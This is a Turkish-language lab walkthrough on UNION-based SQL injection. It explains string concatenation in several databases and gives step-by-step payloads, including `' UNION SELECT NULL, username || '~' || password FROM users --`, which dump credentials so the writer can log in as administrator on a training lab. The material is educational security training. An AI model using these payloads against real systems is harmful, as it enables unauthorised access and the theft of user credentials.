# SQL injection UNION attack, retrieving multiple values in a single column

## Konu Açıklaması (Retrieving Multiple Values within a Single Column)
Bazı durumlarda zafiyet barındıran sorgunun sonucunda yalnızca tek bir sütun string veri tipini destekliyor olabilir veya sorgu sadece tek bir sütun döndürüyor olabilir. Bu senaryoda birden fazla veriyi (örneğin hem kullanıcı adını hem de parolayı) aynı anda elde etmek için **string birleştirme (concatenation)** teknikleri kullanılır.

Farklı veritabanı yönetim sistemlerinde string birleştirme operatörleri ve fonksiyonları:
- **Oracle:** `'foo'||'bar'`
- **Microsoft:** `'foo'+'bar'`
- **PostgreSQL:** `'foo'||'bar'`
- **MySQL:** `'foo' 'bar'` (arada boşluk) veya `CONCAT('foo', 'bar')`

Araya ayırt edici bir ayraç (örneğin `~` işareti) eklenerek veriler şu şekilde tek bir sütunda birleştirilebilir:
```sql
' UNION SELECT username || '~' || password FROM users --
```

---

## Lab Çözümü

### Lab Bilgileri
- **Lab Adı:** SQL injection UNION attack, retrieving multiple values in a single column
- **Zafiyet Türü:** SQL Injection (UNION Attack - String Concatenation)
- **Amaç:** Yalnızca tek bir string sütunun kullanılabilir olduğu bir ortamda birden fazla alanı tek bir sütunda birleştirerek `administrator` parolasını elde etmek ve sisteme giriş yapmak.

### Çözüm Adımları
1. **İstekin Yakalanması ve Kolon/Tür Tespiti:**
   - Bir kategori seçilerek istek Burp Repeater'a aktarılır.
   - Kolon sayısı `ORDER BY` veya `UNION SELECT NULL, NULL --` şeklinde test edilir (2 sütun olduğu tespit edilir).
   - Kolonların veri tipleri incelendiğinde yalnızca 2. sütunun metin (string) desteklediği belirlenir:
     `category=' UNION SELECT NULL, 'a' --`

2. **Verilerin Tek Sütunda Birleştirilerek Çekilmesi:**
   - İkinci sütuna `username` ve `password` değerleri birleştirilerek enjekte edilir:
     ```sql
     ' UNION SELECT NULL, username || '~' || password FROM users --
     ```
   - Yanıt incelendiğinde kullanıcı adları ve parolaları `administrator~password123` formatında tek bir sütunda listelenir.

3. **Giriş ve Labın Tamamlanması:**
   - `administrator` hesabına ait parola bilgisi kopyalanır.
   - Giriş sayfasına (`/login`) gidilerek oturum açılır ve lab tamamlanır.
